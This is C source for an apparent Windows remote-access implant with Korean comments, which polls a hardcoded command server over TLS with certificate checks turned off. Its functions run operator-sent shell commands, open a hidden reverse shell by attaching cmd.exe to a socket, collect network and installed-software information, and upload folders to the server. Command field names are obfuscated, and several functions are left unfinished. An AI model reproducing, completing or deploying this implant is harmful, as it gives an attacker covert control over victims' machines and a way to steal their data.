﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
//
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>
#include "miniz.h"
#include "uploader_module.h"
#include "cJSON.h" // cJSON 라이브러리가 포함되어 있다고 가정

#include <options.h> // WolfSSL 옵션
#include <ssl.h>     // WolfSSL 기본 헤더
#include <wolfcrypt/error-ssl.h> // WolfSSL 오류 코드

// --- 상수 및 설정 ---
#define CHUNK_SIZE 4096             // 수신 버퍼 크기
#define REQUEST_BUFFER_SIZE 8192    // HTTP 요청 생성 버퍼 크기
#define MAX_OUTPUT_SIZE 4096 * 4    // 명령 결과 출력 최대 크기
#define SERVER_IP "192.168.30.129"
#define SERVER_PORT 8000
#define POLL_INTERVAL_SEC 10

// 🟢 클라이언트의 고유 식별자
#define CLIENT_ID "WORKER-C-001"    
static int e_flag = 0;
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wolfssl.lib")


// --- 함수 선언 ---
// [HTTP/Network]
char* http_request(const char* method, const char* path, const char* payload, int payload_len);
char* parse_http_response(const char* full_response, char** json_body);
// 파일 내용이 아닌, 메모리 문자열을 직접 보고합니다. (함수 이름은 유지)
void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code);

// [Execution & Utility]
void parse_command_json(const char* json_string);
char* execute_and_capture(const char* command, int* exit_code);
char* execute_and_capture2(const char* command, int* exit_code, int e_flag);
char* convert_to_utf8(const char* ansi_string);
// char* save_output_to_file(const char* output, int task_id, char* filename_buffer, size_t buffer_size); // 제거됨
// char* read_file_to_string(const char* filepath); // 제거됨
void execute_reverse_shell(int task_id, cJSON* payload);

// [Command Modules]
void execute_shell_command(int task_id, cJSON* payload);
void execute_file_download(int task_id, cJSON* payload);
void execute_get_sysinfo(int task_id, cJSON* payload);



// (기존 헤더: <stdio.h>, <stdlib.h>, <string.h>, <winsock2.h> 또는 <sys/socket.h>, <netinet/in.h>, <arpa/inet.h>, "cJSON.h")

// WolfSSL 컨텍스트 저장을 위한 전역 변수 (또는 싱글톤 구조체)
static WOLFSSL_CTX* ssl_ctx = NULL;

// wolfssl_init_global_context() 함수 (수정 없음)
// 프로그램 시작 시 한 번 호출되어야 합니다.
int wolfssl_init_global_context() {
    // 1. WolfSSL 라이브러리 초기화
    if (wolfSSL_Init() != WOLFSSL_SUCCESS) {
        fprintf(stderr, "[ERROR] WolfSSL 라이브러리 초기화 실패.\n");
        return -1;
    }

    // 2. SSL/TLS 클라이언트 메서드 선택 (TLSv1.2 이상 사용)
    if ((ssl_ctx = wolfSSL_CTX_new(wolfTLSv1_2_client_method())) == NULL) {
        fprintf(stderr, "[ERROR] WolfSSL CTX 생성 실패.\n");
        wolfSSL_Cleanup();
        return -2;
    }

    // (선택 사항) 서버 인증서 검증을 건너뛰는 설정. 
    // 정식 배포 시에는 반드시 신뢰할 수 있는 CA 인증서를 로드해야 합니다.
    wolfSSL_CTX_set_verify(ssl_ctx, WOLFSSL_VERIFY_NONE, 0);

    return 0;
}

// wolfssl_cleanup_global_context() 함수 (수정 없음)
// 프로그램 종료 시 호출되어야 합니다.
void wolfssl_cleanup_global_context() {
    if (ssl_ctx) {
        wolfSSL_CTX_free(ssl_ctx);
        ssl_ctx = NULL;
    }
    // 이 함수가 모든 WolfSSL 리소스를 해제합니다.
    wolfSSL_Cleanup();
}






// ----------------------------------------------------------------------
// 0. 인코딩 및 파일 유틸리티 함수 (수정 없음)
// ----------------------------------------------------------------------

// ANSI (CP_ACP) 인코딩의 명령 결과를 UTF-8로 변환합니다.
char* convert_to_utf8(const char* ansi_string) {
    if (!ansi_string || *ansi_string == '\0') {
        return strdup("");
    }

    int wlen = MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, NULL, 0);
    if (wlen == 0) return strdup("");

    wchar_t* wbuffer = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (!wbuffer) return strdup("");
    MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, wbuffer, wlen);

    int utf8len = WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, NULL, 0, NULL, NULL);
    if (utf8len == 0) { free(wbuffer); return strdup(""); }

    char* utf8_buffer = (char*)malloc(utf8len);
    if (!utf8_buffer) { free(wbuffer); return strdup(""); }
    WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, utf8_buffer, utf8len, NULL, NULL);

    free(wbuffer);
    return utf8_buffer; // 호출자가 free 해야 함
}

// ----------------------------------------------------------------------
// 1. 명령 모듈 정의 (Command Modules)
// ----------------------------------------------------------------------

// ... execute_reverse_shell 함수는 변경 없음 (생략) ...
void execute_reverse_shell(int task_id, cJSON* payload) {
    // ... 기존 리버스 셸 로직 유지 ...
    cJSON* ip_item = cJSON_GetObjectItemCaseSensitive(payload, "ip");
    cJSON* port_item = cJSON_GetObjectItemCaseSensitive(payload, "port");
    WOLFSSL* ssl;  //cㅊ포기화필욯ㅏㄹ수있음
    if (!cJSON_IsString(ip_item) || !cJSON_IsNumber(port_item)) {
        fprintf(stderr, "[ERROR] REVERSE_SHELL_CONNECT: IP 또는 Port가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "IP 또는 Port 매개변수가 누락되었습니다.", 1);
        return;
    }

    const char* server_ip = ip_item->valuestring;
    int server_port = port_item->valueint;

    printf("\n[MODULE] REVERSE_SHELL_CONNECT: %s:%d 로 리버스 셸 연결 시도.\n", server_ip, server_port);

    SOCKET shell_socket;
    struct sockaddr_in server_addr;

    if ((shell_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] 소켓 생성 실패. Code: %d\n", WSAGetLastError());
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "Failed to create socket.", 1);
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(shell_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        fprintf(stderr, "[ERROR] 서버 연결 실패 (%s:%d). Code: %d\n", server_ip, server_port, WSAGetLastError());
        closesocket(shell_socket);
        report_file_to_server(task_id, "FAILED", "rs_connection_fail.txt", "Failed to connect to the shell listener.", 1);
        return;
    }
    ssl = wolfSSL_new(ssl_ctx);
    wolfSSL_set_fd(ssl, (int)shell_socket);
    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        // ... (TLS 핸드셰이크 실패 처리) ...
        wolfSSL_free(ssl); // 소켓 정리 포함
        return;
    }
    //printf("[INFO] 서버 연결 성공. WinAPI를 통해 셸 I/O 연결 시작.\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = (HANDLE)shell_socket;
    si.hStdOutput = (HANDLE)shell_socket;
    si.hStdError = (HANDLE)shell_socket;
    si.wShowWindow = SW_HIDE;

    char cmdLine[] = "cmd.exe /K";

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[ERROR] 셸 프로세스 생성 실패. Code: %d\n", GetLastError());
        closesocket(shell_socket);
        report_file_to_server(task_id, "FAILED", "rs_process_fail.txt", "Failed to launch shell process.", 1);
        return;
    }

    printf("[INFO] 셸 프로세스 (cmd.exe)가 소켓 핸들을 상속받아 백그라운드에서 실행됩니다.\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char report_content[256];
    snprintf(report_content, sizeof(report_content),
        "WinAPI Reverse shell session to %s:%d has been initiated.",
        server_ip, server_port);

    report_file_to_server(task_id, "COMPLETED", "rs_session_start_api.txt", report_content, 0);
}


/**
 * @brief EXECUTE_SHELL 모듈: 쉘 명령을 실행하고 결과를 서버에 보고합니다. (파일 저장 로직 제거)
 */
void execute_shell_command(int task_id, cJSON* payload_item) {
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "coca");
    cJSON* args_item = cJSON_GetObjectItemCaseSensitive(payload_item, "cola");

    if (cJSON_IsString(cmd_item) && cJSON_IsArray(args_item)) {
        const char* base_command = cmd_item->valuestring;
        char full_command[1024];

        // --- 명령 구성 로직 ---
        memset(full_command, 0, sizeof(full_command));
        strncpy(full_command, base_command, sizeof(full_command) - 1);
        full_command[sizeof(full_command) - 1] = '\0';

        cJSON* arg = NULL;
        int remaining_space = sizeof(full_command) - strlen(full_command);

        cJSON_ArrayForEach(arg, args_item) {
            if (cJSON_IsString(arg) && remaining_space > 0) {
                if (remaining_space > 1) {
                    strcat(full_command, " ");
                    remaining_space--;
                }
                strncat(full_command, arg->valuestring, remaining_space);
                remaining_space = sizeof(full_command) - strlen(full_command);
            }
        }
        // --- 명령 구성 로직 끝 ---

        printf("\nfull_command: %s\n", full_command);

        int exit_code = 0;
        // 1. 명령 실행 및 표준 출력(ANSI)을 메모리로 캡처
        char* output = execute_and_capture2(full_command, &exit_code, 1);
        // 2. ANSI 출력을 UTF-8로 변환 (서버에서 안전하게 표시하기 위함)
        //////////////////char* utf8_output = convert_to_utf8(output);

        // 3. 파일 저장 및 읽기 단계를 건너뛰고, 메모리 문자열을 바로 보고
        const char* report_status = (exit_code == 0) ? "COMPLETED" : "FAILED";
        // 서버 UI에서 인식할 가상의 파일명 (실제 파일은 생성되지 않음)
        const char* ui_filename = "stdout_report.txt";

        //printf("[INFO] 명령 실행 결과(UTF-8)를 파일 저장 없이 바로 서버에 보고합니다.\n");

        // 4. 서버에 보고 (직접 메모리 버퍼 전달)
        ////////////////report_file_to_server(task_id, report_status, ui_filename, utf8_output, exit_code);

        //////////if (utf8_output) free(utf8_output);
        ///////////////if (output) free(output);
    }
    else {
        //printf("[ERROR] EXECUTE_SHELL: 'c' 또는 'a'가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing command or arguments.", 1);
    }
}


// ... execute_file_download 함수는 변경 없음 (생략) ...
void execute_file_download(int task_id, cJSON* payload) {
    cJSON* url_item = cJSON_GetObjectItemCaseSensitive(payload, "url");
    cJSON* path_item = cJSON_GetObjectItemCaseSensitive(payload, "path");

    if (cJSON_IsString(url_item) && cJSON_IsString(path_item)) {
        printf("[MODULE] FILE_DOWNLOAD: 다운로드 요청 감지.\n");
        // ... 실제 다운로드 로직은 여기에 구현해야 합니다. ...
        int exit_code = 0;
        char filename[] = "download_log.txt";
        char report_content[] = "File download simulation completed.";
        report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);
    }
    else {
        printf("[ERROR] FILE_DOWNLOAD: Missing URL or Path in payload.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing URL or Path parameters.", 1);
    }
}

// ... execute_get_sysinfo 함수는 변경 없음 (생략) ...
void execute_get_sysinfo(int task_id, cJSON* payload) {
    printf("[MODULE] GET_SYSINFO: 시스템 정보 수집 요청 감지.\n");
    // ... 실제 정보 수집 로직은 여기에 구현해야 합니다. ...
    
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload, "command");
    char full_command[1024];

    //if(strcmp(cmd_item->valuestring, ))
    // --- 명령 구성 로직 ---
    memset(full_command, 0, sizeof(full_command));
    int len = snprintf(full_command, sizeof(full_command), "netstat -ano >> result.txt ");
    len+= snprintf(full_command +len, sizeof(full_command)-len, "&& ipconfig >> result.txt ");
    len+= snprintf(full_command + len, sizeof(full_command)-len, "&& reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall >> result.txt");
    full_command[sizeof(full_command) - 1] = '\0';
    int exit_code = 0;
    e_flag = 1;
    printf("full_command:%s\n", full_command);
    char* output = execute_and_capture2(full_command, &exit_code, e_flag);

    //http_request(const char* method, const char* path, const char* payload, int payload_len)

    
    
    char filename[] = "result.txt";
    char report_content[] = "File download simulation completed.";
    report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);




    //char filename[] = "system_report.txt";
    //char report_content[] = "System info gathered: OS=Windows, RAM=16GB (Simulated)";
    //report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);



}


// ----------------------------------------------------------------------
// 2. cJSON 파싱 및 명령 디스패처 (Command Dispatcher) (변경 없음)
// ----------------------------------------------------------------------

void parse_command_json(const char* json_string) {
    cJSON* root = cJSON_Parse(json_string);
    if (root == NULL) {
        fprintf(stderr, "[ERROR] cJSON 파싱 실패.\n");
        return;
    }

    cJSON* status_item = cJSON_GetObjectItemCaseSensitive(root, "status");

    if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "command_assigned") == 0) {
        cJSON* id_item = cJSON_GetObjectItemCaseSensitive(root, "command_id");
        cJSON* name_item = cJSON_GetObjectItemCaseSensitive(root, "command_name");
        cJSON* payload_item = cJSON_GetObjectItemCaseSensitive(root, "payload");
        cJSON* client_id_item = cJSON_GetObjectItemCaseSensitive(root, "client_id");

        if (cJSON_IsString(name_item) && cJSON_IsObject(payload_item) && cJSON_IsNumber(id_item)) {
            const char* command_name = name_item->valuestring;
            int task_id = id_item->valueint;

            if (cJSON_IsString(client_id_item)) {
                printf("[EXEC] 작업 할당 완료. Task ID: %d, 명령: %s, 대상 클라이언트 ID: %s\n", task_id, command_name, client_id_item->valuestring);
            }

            // 🚩 명령 디스패처 (Command Dispatcher)
            if (strcmp(command_name, "ee") == 0) {
                execute_shell_command(task_id, payload_item);
            }
            else if (strcmp(command_name, "SHELL_CONNECT") == 0) {
                execute_reverse_shell(task_id, payload_item);
                }

            else if (strcmp(command_name, "FILE_DOWNLOAD") == 0) {
                cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "command");
                //execute_file_download(task_id, payload_item);
                printf("payload:%s", cmd_item->valuestring);
                run_file_upload(cmd_item->valuestring);

            }
            else if (strcmp(command_name, "GET_SYSINFO") == 0) {
                execute_get_sysinfo(task_id, payload_item);
            }

            //int run_file_upload(const char* folder)



            else {
                printf("[WARNING] 알 수 없는 명령 유형: %s\n", command_name);
                report_file_to_server(task_id, "FAILED", "error_log.txt", "Unknown command name received.", 1);
            }
        }
    }
    else if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "no_command") == 0) {
        printf("[POLL] 대기 중인 명령 없음.\n");
    }
    else {
        printf("[POLL] 서버 응답: %s\n", cJSON_IsString(status_item) ? status_item->valuestring : "Unknown Status");
    }

    cJSON_Delete(root);
}

// ----------------------------------------------------------------------
// 3. HTTP 요청 및 응답 처리 함수 (변경 없음)
// ----------------------------------------------------------------------

int main() {
    
        if (wolfssl_init_global_context() != 0) {
            return 1;
        }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[ERROR] WinSock 초기화 실패. 코드: %d\n", WSAGetLastError());
        return 1;
    }
    printf("[INFO] WinSock 초기화 성공. 클라이언트 실행됨. ID: %s\n", CLIENT_ID);

    while (1) {
        printf("\n--- %d초 폴링 대기 중 ---\n", POLL_INTERVAL_SEC);
        Sleep(POLL_INTERVAL_SEC * 1000);

        char poll_path[128];
        snprintf(poll_path, sizeof(poll_path), "/api/poll/?client_id=%s", CLIENT_ID);

        printf("[INFO] 서버에 명령 폴링 요청: %s\n", poll_path);

        char* full_response = http_request("GET", poll_path, NULL, 0);

        if (full_response != NULL) {
            char* json_body = NULL;
            parse_http_response(full_response, &json_body);

            if (json_body != NULL) {
                printf("[INFO] JSON 본문 수신: %s\n", json_body);
                parse_command_json(json_body);
                free(json_body);
            }
            else {
                fprintf(stderr, "[ERROR] HTTP 본문 추출 실패 또는 빈 응답.\n");
            }
            free(full_response);
        }
        else {
            fprintf(stderr, "[ERROR] HTTP 요청 실패. 다음 폴링 대기.\n");
        }
    }

    WSACleanup();
    wolfssl_cleanup_global_context();
    return 0;
}

// 기존 코드에서 사용하는 상수들은 정의되어 있다고 가정합니다.
// (예: REQUEST_BUFFER_SIZE, CHUNK_SIZE, SERVER_IP, SERVER_PORT, SOCKET, INVALID_SOCKET, closesocket)

char* http_request(const char* method, const char* path, const char* payload, int payload_len) {
    SOCKET sock;
    struct sockaddr_in server;
    WOLFSSL* ssl = NULL; // WolfSSL 세션 구조체

    char request[REQUEST_BUFFER_SIZE];
    char recv_buffer[CHUNK_SIZE];

    char* full_response = NULL;
    int total_received = 0;
    int recv_size;

    // 전역 SSL 컨텍스트가 초기화되었는지 확인
    if (ssl_ctx == NULL) {
        fprintf(stderr, "[ERROR] WolfSSL 전역 컨텍스트가 초기화되지 않았습니다.\n");
        return NULL;
    }

    // 1. TCP 소켓 생성 (기존과 동일)
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) return NULL;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT); // 서버 포트가 HTTPS 포트 (일반적으로 443)인지 확인

    // 2. TCP 연결 (기존과 동일)
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        return NULL;
    }

    // 3. WolfSSL 세션 생성
    if ((ssl = wolfSSL_new(ssl_ctx)) == NULL) {
        fprintf(stderr, "[ERROR] WolfSSL 세션 생성 실패.\n");
        closesocket(sock);
        return NULL;
    }

    // 4. 소켓을 WolfSSL 세션에 바인딩
    // WolfSSL이 이 소켓을 통해 데이터를 전송/수신하도록 설정
    if (wolfSSL_set_fd(ssl, sock) != WOLFSSL_SUCCESS) {
        fprintf(stderr, "[ERROR] WolfSSL 소켓 설정 실패.\n");
        wolfSSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    // 5. SSL/TLS 핸드셰이크 수행 (가장 중요한 부분)
    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        int err = wolfSSL_get_error(ssl, 0);
        fprintf(stderr, "[ERROR] WolfSSL 핸드셰이크 실패. 오류 코드: %d\n", err);
        wolfSSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    // 6. HTTP(S) 요청 문자열 생성 (기존과 동일)
    // 요청 헤더에 변경은 없습니다. 연결은 암호화 채널을 통해 이루어집니다.
    if (strcmp(method, "GET") == 0) {
        snprintf(request, REQUEST_BUFFER_SIZE,
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Connection: close\r\n\r\n",
            path, SERVER_IP, SERVER_PORT
        );
    }
    else if (strcmp(method, "POST") == 0) {
        // 주의: snprintf의 인자 순서가 원본 코드에서 payload_len과 payload의 위치가 바뀌어 있었습니다.
        // 다음처럼 수정해야 Content-Length와 Payload가 올바르게 들어갑니다.
        snprintf(request, REQUEST_BUFFER_SIZE,
            "POST %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %d\r\n"
            "Connection: close\r\n\r\n"
            "%s",
            path, SERVER_IP, SERVER_PORT, payload_len, payload // 수정된 부분
        );
    }
    else {
        wolfSSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    // 7. 암호화된 요청 전송 (wolfSSL_write 사용)
    if (wolfSSL_write(ssl, request, strlen(request)) < 0) {
        fprintf(stderr, "[ERROR] WolfSSL 데이터 전송 실패.\n");
        wolfSSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    // 8. 암호화된 응답 수신 (wolfSSL_read 사용)
    while ((recv_size = wolfSSL_read(ssl, recv_buffer, CHUNK_SIZE)) > 0) {
        char* temp = (char*)realloc(full_response, total_received + recv_size + 1);
        if (temp == NULL) break;

        full_response = temp;
        memcpy(full_response + total_received, recv_buffer, recv_size);
        total_received += recv_size;
        full_response[total_received] = '\0';
    }

    // wolfSSL_read의 종료 조건을 확인합니다.
    // 0이면 연결 종료, -1 이하면 오류입니다.
    if (recv_size < 0) {
        int err = wolfSSL_get_error(ssl, recv_size);
        // 대부분의 경우 WOLFSSL_ERROR_ZERO_RETURN (0)은 정상적인 연결 종료입니다.
        if (err != WOLFSSL_ERROR_ZERO_RETURN && err != WOLFSSL_ERROR_NONE) {
            fprintf(stderr, "[ERROR] WolfSSL 응답 수신 중 오류 발생: %d.\n", err);
        }
    }

    // 9. WolfSSL 세션 정리 및 소켓 닫기
    wolfSSL_free(ssl);
    closesocket(sock);

    return full_response;
}

char* parse_http_response(const char* full_response, char** json_body) {
    const char* body_start = strstr(full_response, "\r\n\r\n");

    if (body_start == NULL) return NULL;
    body_start += 4;

    size_t body_len = strlen(body_start);
    if (body_len == 0) return NULL;

    *json_body = (char*)malloc(body_len + 1);
    if (*json_body == NULL) return NULL;

    strcpy(*json_body, body_start);
    return (char*)body_start;
}

// 파일 내용을 읽지 않고, 인수로 전달받은 raw_content(메모리 문자열)를 바로 JSON에 포함하여 전송합니다.
void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code) {
    cJSON* report_json = cJSON_CreateObject();

    cJSON_AddNumberToObject(report_json, "command_id", task_id);
    cJSON_AddStringToObject(report_json, "status", status);
    // 이 파일명은 실제 파일이 아닌, 서버 UI에서 이 보고서를 구분하는 이름입니다.
    cJSON_AddStringToObject(report_json, "filename", filename_for_ui);

    // **핵심 변경**: raw_content(명령 실행 결과)를 file_content 필드에 직접 포함
    cJSON_AddStringToObject(report_json, "file_content", raw_content ? raw_content : "No content captured.");
    cJSON_AddNumberToObject(report_json, "exit_code", exit_code);

    char* json_payload = cJSON_PrintUnformatted(report_json);

    if (json_payload) {
        printf("\n[REPORT] 서버에 메모리 문자열 JSON 보고: /api/upload/receive/\n");

        char* response = http_request("POST", "/api/upload/receive/", json_payload, strlen(json_payload));

        if (response != NULL) {
            printf("[INFO] 보고 응답 수신.\n");
            free(response);
        }
        else {
            fprintf(stderr, "[ERROR] 보고서 전송 실패.\n");
        }

        free(json_payload);
    }
    else {
        fprintf(stderr, "[ERROR] 보고 JSON 생성 실패.\n");
    }

    cJSON_Delete(report_json);
}

// ----------------------------------------------------------------------
// 4. 명령 실행 및 결과 캡처 함수 (_popen 사용) (변경 없음)
// ----------------------------------------------------------------------

char* execute_and_capture2(const char* command, int* exit_code, int e_flag) {
    FILE* fp;
    char buffer[256];
    char* result_output = (char*)malloc(MAX_OUTPUT_SIZE);
    char* output_filename = "result.txt";
    char* new_filename = "C:\\test\\result.txt";\
    FILE* fp2 = fopen(new_filename, "a");
    


    if (result_output == NULL) {
        *exit_code = -1;
        return strdup("[ERROR] Memory allocation failed for command output.");
    }
    result_output[0] = '\0';

    fp = _popen(command, "r");
    if (fp == NULL) {
        *exit_code = -1;
        sprintf(result_output, "[ERROR] Failed to execute command via _popen: %s", command);
        return result_output;
    } 
    char buffer3[1024];
    while (fgets(buffer3, sizeof(buffer3), fp) != NULL) {
        size_t buffer_len = strlen(buffer3);
        printf("%s", buffer3);
        fwrite(buffer3, sizeof(char), strlen(buffer3), fp2);
    } 

    fclose(fp);
    printf("result_output:%s\n", result_output);

    fclose(fp2);
    printf("creation");

     
    MoveFileA(output_filename, new_filename);
    Sleep(3000);
    DWORD dwThreadId = 0;
    HANDLE hThread = NULL;
    //printf("thisis1\n");
   //////////// hThread = CreateThread(NULL, 0, run_file_upload, e_flag, 0, dwThreadId);
    //printf("thisis3\n");

    //_pclose(fp);
    CloseHandle(hThread);

    
}

char* execute_and_capture(const char* command, int* exit_code) {



}